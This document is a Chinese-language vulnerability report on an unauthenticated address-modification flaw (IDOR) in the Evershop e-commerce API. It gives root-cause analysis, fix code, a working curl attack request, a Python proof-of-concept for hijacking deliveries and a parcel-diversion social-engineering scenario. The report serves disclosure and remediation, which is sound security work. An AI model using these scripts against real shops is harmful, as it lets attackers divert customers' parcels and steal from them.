# Evershop updateCustomerAddress 未授权修改任意地址漏洞报告

## 1. 漏洞挖掘目标

- **受影响系统/产品**：Evershop E-commerce Platform
- **受影响版本**：2.1.0 及之前版本
- **仓库地址**：https://github.com/evershopcommerce/evershop

## 2. 漏洞说明

### 2.1 漏洞描述

- **漏洞类型**：不安全的直接对象引用 (IDOR, CWE-639)
- **漏洞名称**：Evershop updateCustomerAddress API 未授权修改任意客户地址漏洞
- **风险等级**：高危
- **概述**：`PATCH /customers/:customer_id/addresses/:address_id` API 端点配置为公开访问（`access="public"`），无需任何身份认证即可修改任意客户的收货地址信息。攻击者可篡改他人收货地址，导致订单配送错误或进行社会工程攻击。

### 2.2 利用前提与特征

- **利用难度**：中
- **权限要求**：无需认证
- **操作条件**：
  1. 获取目标客户的UUID（customer_id）
  2. 获取目标地址的UUID（address_id）
- **攻击特征**：发送PATCH请求修改地址字段

### 2.3 漏洞效果

漏洞攻击成功后的效果如下：

1. **地址篡改**：修改收货地址到攻击者控制的位置
2. **包裹劫持**：受害者的订单可能被配送到攻击者指定地址
3. **信息窃取**：获取原地址信息（响应中返回）
4. **业务影响**：导致订单配送纠纷，损害平台信誉

## 3. 漏洞复现

- **是否可以制作成自动化复现脚本**：是

### 3.1 漏洞复现过程

**步骤1：确认路由配置**

文件：`packages/evershop/src/modules/customer/api/updateCustomerAddress/route.json`
```json
{
  "methods": ["PATCH"],
  "path": "/customers/:customer_id/addresses/:address_id",
  "access": "public"  // <-- 无需认证！
}
```

**步骤2：分析Handler逻辑**

文件：`packages/evershop/src/modules/customer/api/updateCustomerAddress/updateCustomerAddress.js`
```javascript
export default async (request, response, next) => {
  try {
    // 验证客户存在性
    const customer = await select()
      .from('customer')
      .where('uuid', '=', request.params.customer_id)
      .load(pool);
    if (!customer) { /* 返回错误 */ }

    // 验证地址属于该客户
    const address = await select()
      .from('customer_address')
      .where('uuid', '=', request.params.address_id)
      .and('customer_id', '=', customer.customer_id)
      .load(pool);
    if (!address) { /* 返回错误 */ }

    // 更新地址 - 未验证请求者身份！
    const newAddress = await updateCustomerAddress(
      request.params.address_id,
      request.body  // 用户输入直接传入
    );
    // ...
  }
};
```

**步骤3：发送攻击请求**

```bash
# 修改任意客户的地址
curl -X PATCH 'https://target.com/api/customers/victim-uuid/addresses/addr-uuid' \
  -H 'Content-Type: application/json' \
  -d '{
    "full_name": "Attacker Name",
    "address_1": "456 Attacker Street",
    "city": "Attacker City",
    "postcode": "99999",
    "telephone": "555-EVIL"
  }'
```

**预期响应**（修改成功）：
```json
{
  "data": {
    "uuid": "addr-uuid",
    "full_name": "Attacker Name",
    "address_1": "456 Attacker Street",
    "city": "Attacker City",
    "postcode": "99999"
  }
}
```

## 4. 漏洞利用

- **是否可以制作成自动化复现脚本**：是

### 4.1 利用脚本

```python
#!/usr/bin/env python3
"""
Evershop IDOR PoC - Modify Any Customer Address
"""

import requests
import json

class AddressModifier:
    def __init__(self, target_url):
        self.target_url = target_url

    def modify_address(self, customer_id, address_id, new_address_data):
        """
        修改指定客户的指定地址
        """
        endpoint = f"{self.target_url}/api/customers/{customer_id}/addresses/{address_id}"

        print(f"[*] 目标端点: {endpoint}")
        print(f"[*] 新地址数据: {json.dumps(new_address_data, indent=2)}")

        response = requests.patch(endpoint, json=new_address_data)

        if response.status_code == 200:
            data = response.json().get('data', {})
            print("[+] 地址修改成功!")
            print(f"    地址UUID: {data.get('uuid')}")
            print(f"    新收件人: {data.get('full_name')}")
            print(f"    新地址: {data.get('address_1')}")
            return data
        else:
            print(f"[-] 修改失败: {response.status_code}")
            print(f"    响应: {response.text}")
            return None

    def hijack_delivery(self, customer_id, address_id, attacker_address):
        """
        劫持配送地址
        """
        print("\n[!] 执行配送劫持攻击...")
        return self.modify_address(customer_id, address_id, attacker_address)


def main():
    target = "https://shop.example.com"
    customer_id = "victim-customer-uuid"
    address_id = "victim-address-uuid"

    # 攻击者控制的地址
    attacker_address = {
        "full_name": "Attacker Name",
        "address_1": "456 Attacker Street",
        "city": "Attacker City",
        "country_id": 1,
        "province_id": 1,
        "postcode": "99999",
        "telephone": "555-0000"
    }

    modifier = AddressModifier(target)
    modifier.hijack_delivery(customer_id, address_id, attacker_address)


if __name__ == "__main__":
    main()
```

### 4.2 社会工程攻击场景

```python
def social_engineering_attack(modifier, customer_id, address_id):
    """
    社会工程攻击：修改地址后诱导受害者确认订单
    """
    # 1. 保存原地址信息（从其他漏洞获取）
    original_address = {
        "full_name": "Victim Name",
        "address_1": "123 Victim Street"
    }

    # 2. 修改为攻击者地址
    attacker_address = {
        "full_name": "Victim Name",  # 保持姓名不变
        "address_1": "456 Attacker Street",  # 修改地址
        "city": "Attacker City",
        "postcode": "99999"
    }

    print("[*] 阶段1: 修改受害者地址")
    modifier.modify_address(customer_id, address_id, attacker_address)

    print("[*] 阶段2: 等待受害者下单...")
    # 受害者可能不会注意到地址变化

    print("[*] 阶段3: 包裹被配送到攻击者地址")
```

## 5. 漏洞原理

### 5.1 数据流分析

```
┌────────────────────────────────────────────────────────────────┐
│              地址修改IDOR数据流                                  │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  攻击者                            受害者                       │
│    │                                 │                         │
│    │                                 ▼                         │
│    │                          [设置收货地址]                    │
│    │                          address_1: "123 Victim St"       │
│    │                                 │                         │
│    ▼                                 │                         │
│  ┌───────────────────────────────────────────────────┐        │
│  │ PATCH /customers/:customer_id/addresses/:addr_id │        │
│  │ { "address_1": "456 Attacker St" }               │        │
│  └───────────────────────────────────────────────────┘        │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ updateCustomerAddress.js                │                  │
│  │                                         │                  │
│  │ 1. 验证customer_id存在 ✓                │                  │
│  │ 2. 验证address_id属于customer ✓          │                  │
│  │ 3. 验证请求者是否为customer ✗            │  ← 缺失!        │
│  │ 4. updateCustomerAddress(addr, body)    │                  │
│  └─────────────────────────────────────────┘                  │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ 数据库更新:                              │                  │
│  │ customer_address SET                    │                  │
│  │   address_1 = '456 Attacker St'         │                  │
│  │ WHERE uuid = 'addr-uuid'                │                  │
│  └─────────────────────────────────────────┘                  │
│            │                                                   │
│            ▼                                                   │
│  受害者下次下单时，包裹被配送到攻击者地址!                       │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

### 5.2 根因分析

1. **路由公开访问**：`access="public"` 允许未认证请求
2. **缺失身份验证**：Handler未验证请求者是否为地址所有者
3. **信任客户端参数**：直接使用URL中的customer_id而非会话中的用户ID

## 6. 修复建议

### 6.1 方案A：修改路由为私有

```json
// route.json
{
  "methods": ["PATCH"],
  "path": "/customers/:customer_id/addresses/:address_id",
  "access": "private"
}
```

### 6.2 方案B：在Handler中验证身份

```javascript
// updateCustomerAddress.js
export default async (request, response, next) => {
  try {
    // 1. 获取当前登录用户
    const currentCustomer = request.getCurrentCustomer();
    if (!currentCustomer) {
      response.status(UNAUTHORIZED);
      return response.json({
        error: { message: 'Authentication required' }
      });
    }

    // 2. 验证操作权限 - 只能修改自己的地址
    if (currentCustomer.uuid !== request.params.customer_id) {
      response.status(FORBIDDEN);
      return response.json({
        error: { message: 'You can only modify your own addresses' }
      });
    }

    // 3. 原有逻辑...
  }
};
```

### 6.3 敏感字段保护

```javascript
// 某些字段不应该被批量修改
const PROTECTED_FIELDS = ['customer_id', 'created_at', 'uuid'];
Object.keys(request.body).forEach(key => {
  if (PROTECTED_FIELDS.includes(key)) {
    delete request.body[key];
  }
});
```

---

**报告编写日期**：2026-01-04
**分析师**：Claude Code Security Analyzer
